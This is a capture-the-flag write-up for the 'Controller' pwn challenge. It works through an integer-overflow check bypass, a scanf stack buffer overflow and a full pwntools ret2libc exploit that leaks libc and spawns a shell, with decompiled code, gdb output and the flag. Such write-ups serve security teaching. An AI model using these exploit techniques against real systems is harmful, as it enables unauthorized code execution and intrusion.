# Controller

This was the first pwn challenge and rated as easiest difficulty in the CTF and I managed to get the first blood on it, for the time being servers were acting a bit up, so that would've been an issue for other people to submit at a reasonable time to compete for the first blood.

# Vulnerability

Running `file` and `checksec` we will get to see that the given binary is x86_64 binary and has every usual protection is off except the NX stack and Full RELRO meaning no GOT overwrite or any of the destructor routing overwrite.

```r
❯ file controller
controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
❯ checksec controller
[*] '/home/d4mianwayne/Pwning/CTFs/ApocalypseCTF/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Opening the binary in the IDA, the `main` function was calling the `calculator` function, checking the `calculator` function, we could see:-

```C
__int64 __fastcall calculator(__int64 a1)
{
  __int64 result; // rax
  char v2[28]; // [rsp+0h] [rbp-20h] BYREF
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = calc();
  if ( v3 != 65338 )
    return calculator(a1);
  printstr("Something odd happened!\nDo you want to report the problem?\n> ");
  __isoc99_scanf("%s", v2);
  if ( v2[0] == 121 || v2[0] == 89 )
    result = printstr("Problem reported!\n");
  else
    result = printstr("Problem ingored\n");
  return result;
}
```

We have a buffee overflow vulnerability because of the `%s` specifier of the `scanf` but in order to call i, we have to make the function `calc` return the `65338` possibly from the operation it does. Checking the function `calc`:-

```r
__int64 calc()
{
  unsigned __int16 v0; // ax
  unsigned int v2; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v3; // [rsp+4h] [rbp-Ch] BYREF
  int v4; // [rsp+8h] [rbp-8h]
  unsigned int v5; // [rsp+Ch] [rbp-4h]

  printstr("Insert the amount of 2 different types of recources: ");
  __isoc99_scanf("%d %d", &v3, &v2);
  v4 = menu();
  if ( (int)v3 > 69 || (int)v2 > 69 )
  {
    printstr("We cannot use these many resources at once!\n");
    exit(105);
  }
  if ( v4 == 2 )
  {
    v5 = sub(v3, v2);
    printf("%d - %d = %d\n", v3, v2, v5);
  }
  else if ( v4 > 2 )
  {
    if ( v4 == 3 )
    {
      v0 = mult(v3, v2);
      v5 = v0;
      printf("%d * %d = %d\n", v3, v2, v0);
    }
    else
    {
      if ( v4 != 4 )
        goto LABEL_15;
      v5 = (int)divi(v3, v2);
      printf("%d / %d = %d\n", v3, v2, v5);
    }
  }
  else
  {
    if ( v4 != 1 )
    {
LABEL_15:
      printstr("Invalid operation, exiting..\n");
      return v5;
    }
    v5 = add(v3, v2);
    printf("%d + %d = %d\n", v3, v2, v5);
  }
  return v5;
}
```

So, this function is used to do operations like additio, substraction, multiplication and division, also the 2 numbers we input are checked whether they are bigger than 69 or not, if yes, then call the `exit`. But the catch here is, there's no check for the negative numbers, which means we can give negative number, so giving a right negative integer we can make it happen.

# Exploitation

To exploit the binary, the usual way was to make the `calc` return `65338` and then trigger the buffer overflow vulnerability to peform a return-to-libc attack. So, first we will make the `calc` return the `65338` by giving a negative integer.


So, firstly I chose the `4295032634`, since the maximun range of the `unsigned int` data type is `4294967295`, so by basic operation:-

```py
>>> 4295032634 - 4294967295 - 1
65338

[..snip..]
p.sendlineafter(": ", "0 -4295032634")
p.sendlineafter("> ", "2")
```

Checking it in `gdb`:-

```r
gef➤  b *calculator + 16
Breakpoint 1 at 0x401076
gef➤  
gef➤  r
Starting program: /home/d4mianwayne/Pwning/CTFs/ApocalypseCTF/controller 

👾 Control Room 👾

Insert the amount of 2 different types of recources: 0 -4295032634
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 2
0 - -65338 = 65338

Breakpoint 1, 0x0000000000401076 in calculator ()


[..snip..]


     0x40106a <calculator+4>   sub    rsp, 0x20
     0x40106e <calculator+8>   call   0x400f01 <calc>
     0x401073 <calculator+13>  mov    DWORD PTR [rbp-0x4], eax
 →   0x401076 <calculator+16>  cmp    DWORD PTR [rbp-0x4], 0xff3a
     0x40107d <calculator+23>  jne    0x4010f1 <calculator+139>
     0x40107f <calculator+25>  lea    rdi, [rip+0x322]        # 0x4013a8
     0x401086 <calculator+32>  call   0x400dcd <printstr>
     0x40108b <calculator+37>  lea    rax, [rbp-0x20]
     0x40108f <calculator+41>  mov    rsi, rax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "controller", stopped 0x401076 in calculator (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401076 → calculator()
[#1] 0x401160 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
gef➤  x/wx $rbp - 0x4
0x7fffffffdd0c:	0x0000ff3a
```


Now, from here, it was easy as leaking a GOT entry beforehand, then just peform the ret2libc attack, this being done, the `libc.so.6` which was ditributed along side the other challenges was same, `GLIBC-2.27ubuntu1.4`. So, from here, the exploit was straightforward:-

```py
pop_rdi = 0x00000000004011d3

payload = b"A"*40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendlineafter("> ", payload)
p.recvuntil("d\n")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
log.info(f"LIBC:   {hex(libc.address)}")

# Recalling the main, and again triggering the `calc` to return the 65338 as result

p.sendlineafter(": ", "0 -4295032634")
p.sendlineafter("> ", "2")
sleep(1)

payload = b"A"*40
payload += p64(0x0000000000400606)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])

p.sendlineafter("> ", payload)
p.interactive()
```

The flag was: `CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}`